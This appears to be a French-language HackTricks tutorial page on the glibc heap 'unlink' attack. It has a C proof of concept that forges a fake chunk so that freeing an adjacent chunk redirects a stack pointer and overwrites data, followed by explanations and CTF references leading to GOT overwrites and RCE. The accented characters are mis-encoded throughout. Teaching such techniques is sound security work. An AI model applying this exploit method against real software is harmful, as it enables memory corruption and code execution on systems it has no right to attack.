# Unlink Attack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informations de base

Lorsque cette attaque a √©t√© d√©couverte, elle permettait principalement un WWW (Write What Where), cependant, certaines **v√©rifications ont √©t√© ajout√©es** rendant la nouvelle version de l'attaque plus int√©ressante, plus complexe et **inutile**.

### Exemple de code :

<details>

<summary>Code</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* L'attaque ne fonctionne pas si les tcaches sont utilis√©s (apr√®s 2.26)

### Objectif

Cette attaque permet de **changer un pointeur vers un chunk pour pointer 3 adresses avant lui-m√™me**. Si ce nouvel emplacement (environnements de l'endroit o√π le pointeur √©tait situ√©) contient des √©l√©ments int√©ressants, comme d'autres allocations contr√¥lables / pile..., il est possible de les lire/√©craser pour causer un plus grand dommage.

* Si ce pointeur √©tait situ√© dans la pile, parce qu'il pointe maintenant 3 adresses avant lui-m√™me et que l'utilisateur peut potentiellement le lire et le modifier, il sera possible de leak des informations sensibles de la pile ou m√™me de modifier l'adresse de retour (peut-√™tre) sans toucher au canary.
* Dans des exemples CTF, ce pointeur est situ√© dans un tableau de pointeurs vers d'autres allocations, donc, en le faisant pointer 3 adresses avant et en √©tant capable de le lire et de l'√©crire, il est possible de faire pointer les autres pointeurs vers d'autres adresses.\
Comme l'utilisateur peut potentiellement lire/√©crire √©galement les autres allocations, il peut leak des informations ou √©craser de nouvelles adresses √† des emplacements arbitraires (comme dans le GOT).

### Exigences

* Un certain contr√¥le dans une m√©moire (par exemple, la pile) pour cr√©er quelques chunks en donnant des valeurs √† certains des attributs.
* Leak de la pile afin de d√©finir les pointeurs du faux chunk.

### Attaque

* Il y a quelques chunks (chunk1 et chunk2)
* L'attaquant contr√¥le le contenu de chunk1 et les en-t√™tes de chunk2.
* Dans chunk1, l'attaquant cr√©e la structure d'un faux chunk :
* Pour contourner les protections, il s'assure que le champ `size` est correct pour √©viter l'erreur : `corrupted size vs. prev_size while consolidating`
* et les champs `fd` et `bk` du faux chunk pointent vers l'endroit o√π le pointeur chunk1 est stock√© avec des d√©calages de -3 et -2 respectivement, donc `fake_chunk->fd->bk` et `fake_chunk->bk->fd` pointent vers une position en m√©moire (pile) o√π l'adresse r√©elle de chunk1 est situ√©e :

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Les en-t√™tes de chunk2 sont modifi√©s pour indiquer que le chunk pr√©c√©dent n'est pas utilis√© et que la taille est celle du faux chunk contenu.
* Lorsque le deuxi√®me chunk est lib√©r√©, ce faux chunk est d√©solidaris√©, ce qui se produit :
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Auparavant, il avait √©t√© fait que `fake_chunk->fd->bk` et `fake_chunk->bk->fd` pointent vers le m√™me endroit (l'emplacement dans la pile o√π `chunk1` √©tait stock√©, donc c'√©tait une liste cha√Æn√©e valide). Comme **les deux pointent vers le m√™me emplacement**, seul le dernier (`fake_chunk->bk->fd = fake_chunk->fd`) prendra **effet**.
* Cela va **√©craser le pointeur vers chunk1 dans la pile √† l'adresse (ou aux octets) stock√©s 3 adresses avant dans la pile**.
* Par cons√©quent, si un attaquant pouvait contr√¥ler √† nouveau le contenu de chunk1, il sera capable de **√©crire dans la pile**, pouvant potentiellement √©craser l'adresse de retour en contournant le canary et modifier les valeurs et les pointeurs des variables locales. M√™me en modifiant √† nouveau l'adresse de chunk1 stock√©e dans la pile vers un emplacement diff√©rent o√π, si l'attaquant pouvait √† nouveau contr√¥ler le contenu de chunk1, il pourrait √©crire n'importe o√π.
* Notez que cela √©tait possible parce que les **adresses sont stock√©es dans la pile**. Le risque et l'exploitation peuvent d√©pendre de **l'endroit o√π les adresses du faux chunk sont stock√©es**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## R√©f√©rences

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* Bien qu'il serait √©trange de trouver une attaque unlink m√™me dans un CTF, voici quelques writeups o√π cette attaque a √©t√© utilis√©e :
* Exemple CTF : [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* Dans cet exemple, au lieu de la pile, il y a un tableau d'adresses malloc√©es. L'attaque unlink est effectu√©e pour pouvoir allouer un chunk ici, permettant ainsi de contr√¥ler les pointeurs du tableau d'adresses malloc√©es. Ensuite, il y a une autre fonctionnalit√© qui permet de modifier le contenu des chunks √† ces adresses, ce qui permet de pointer des adresses vers le GOT, de modifier les adresses de fonction pour obtenir des leaks et RCE.
* Un autre exemple CTF : [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* Tout comme dans l'exemple pr√©c√©dent, il y a un tableau d'adresses d'allocations. Il est possible d'effectuer une attaque unlink pour faire pointer l'adresse de la premi√®re allocation quelques positions avant le d√©but du tableau et de r√©√©crire cette allocation √† la nouvelle position. Par cons√©quent, il est possible d'√©craser les pointeurs d'autres allocations pour pointer vers le GOT de atoi, de l'imprimer pour obtenir un leak libc, puis de r√©√©crire le GOT de atoi avec l'adresse d'un gadget.
* Exemple CTF avec des fonctions malloc et free personnalis√©es qui abusent d'une vuln√©rabilit√© tr√®s similaire √† l'attaque unlink : [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* Il y a un overflow qui permet de contr√¥ler les pointeurs FD et BK de malloc personnalis√© qui seront (personnalis√©s) lib√©r√©s. De plus, le tas a le bit d'ex√©cution, donc il est possible de leak une adresse de tas et de pointer une fonction du GOT vers un chunk de tas avec un shellcode √† ex√©cuter.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
